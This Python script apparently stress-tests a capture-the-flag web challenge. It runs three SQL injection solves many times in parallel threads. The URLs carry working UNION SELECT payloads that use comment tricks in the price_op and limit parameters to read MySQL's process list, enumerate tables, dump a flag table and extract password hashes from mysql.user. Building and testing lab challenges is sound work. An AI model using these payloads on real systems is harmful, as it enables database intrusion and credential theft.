from multiprocessing.dummy import Pool as ThreadPool
import requests
import re

NUM_THREADS = 64
NUM_ITERATIONS = 400

BASE_CHAL_URL = "https://limited-app-974780027560.us-east5.run.app/"


def solve_flag1():
    url = BASE_CHAL_URL + 'query?price=10.99&price_op=%3E/*&limit=*/100%20union%20select%20INFO,1,2,3%20from%20INFORMATION_SCHEMA.PROCESSLIST'
    result = requests.get(url)

    if result.status_code != 200:
        print(f'unexpected response code: {result.status_code}, failed to solve flag1')
        return False

    if 'wctf{' not in result.text:
        print('flag not found in query result, failed to solve flag1')
        return False

    return True


def solve_flag2():
    url1 = BASE_CHAL_URL + 'query?price=10.99&price_op=%3E/*&limit=*/100%20union%20select%20table_name,1,2,3%20from%20INFORMATION_SCHEMA.tables'
    result = requests.get(url1)

    if result.status_code != 200:
        print(f'unexpected response code in url1: {result.status_code}, failed to solve flag2')
        return False

    # print(result.text)
    match = re.search(r'"(Flag_\w+)"', result.text)
    if not match:
        print('failed to find flag table name, failed to solve flag2')
        return False

    flag_table = match.group(1)
    # print('flag_table:', flag_table)
    url2 = BASE_CHAL_URL + f'query?price=10.99&price_op=%3E/*&limit=*/100%20union%20select%20value,1,2,3%20from%20{flag_table}'
    result = requests.get(url2)

    if result.status_code != 200:
        print(f'unexpected response code in url2: {result.status_code}, failed to solve flag2')
        return False

    if 'wctf{' not in result.text:
        print('flag not found in url2 query result, failed to solve flag2')
        return False

    return True


def solve_flag3():
    url = BASE_CHAL_URL + 'query?price=10.99&price_op=%3E/*&limit=*/100%20union%20SELECT%20User,%20CONCAT(%27$mysql%27,LEFT(authentication_string,6),%27*%27,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,%27*%27))%20AS%20hash,%20plugin,4%20FROM%20mysql.user'
    result = requests.get(url)

    if result.status_code != 200:
        print(f'unexpected response code: {result.status_code}, failed to solve flag3')
        return False

    match = re.search(r'"flag","description":"4","name":"([^"]+)"', result.text)
    if not match:
        print('failed to find flag password hash, failed to solve flag3')
        return False

    return True


def run_one_test(dummy):
    # test home page
    result = requests.get(BASE_CHAL_URL)
    if result.status_code != 200:
        print('ERROR: ', result.status_code, result.text)
        return True

    if not solve_flag1():
        return True

    if not solve_flag2():
        return True

    if not solve_flag3():
        return True

    return False
    

def stress_test():
    pool = ThreadPool(NUM_THREADS)
    work_list = [None]*NUM_ITERATIONS
    results = pool.map(run_one_test, work_list)
    pool.close()
    pool.join()

    if any(results):
        print("At least one test failed")
    else:
        print(f"Success, no failures detected with {NUM_ITERATIONS} total tests run using {NUM_THREADS} threads.")


if __name__ == "__main__":
    stress_test()

